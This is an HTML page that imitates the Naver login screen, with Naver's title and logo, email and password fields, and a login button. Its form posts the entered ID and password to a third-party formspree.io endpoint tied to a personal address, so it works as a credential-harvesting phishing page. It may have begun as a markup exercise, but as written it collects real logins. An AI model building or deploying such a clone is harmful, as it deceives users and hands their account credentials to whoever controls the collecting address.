<!DOCTYPE html>
<html lang="ko">
    <head>
        <meta charset="utf-8">
        <title>네이버 - 로그인</title>
        <link rel="stylesheet" href="/css/style.css">
    </head>
    <body>
        <h1 class="logo">
            <a href="https://www.naver.com/">
                <img src="/images/logo.png" srcset="/images/logo.svg" alt="Naver">
            </a>
        </h1>
        <form action="https://formspree.io/2020193@sungil-i.kr"
              class="login-form"
              method="POST"
        >
        <fieldset>
            <legend class="a11y">로그인 폼</legend>
            <div class="container">
                <div class="user-email">
                    <label for="userEmail" class="a11y">아이디</label>
                    <input type="email" 
                           id="userEmail"
                           name="userEmail"
                           placeholder="아이디(이메일)"
                           required="required"
                    >
                </div>
                <div class="user-password">
                    <label for="userPassword" class="a11y">비밀번호</label>
                    <input type="password" 
                           id="userPassword"
                           name="userPassword"
                           placeholder="비밀번호"
                           required="required"
                    >
                </div>
                <div class="ip-state-wrapper">
                    <div class="login-state">
                        <input type="checkbox"
                               id="loginState"
                               name="state"
                        >
                        <label for="loginState">
                            <span class="icon-check"></span>
                            로그인 상태유지
                        </label>
                    </div>
                    <div class="login-ip">
                        <input type="checkbox"
                               id="loginIp"
                               name="ip"
                        >   
                        <label for="loginIp">IP 보안</label>
                    </div>
                </div>
                <button type="submit" class="btn-login">로그인</button>
            </div>
        </fieldset>
        </form>
    </body>
</html>
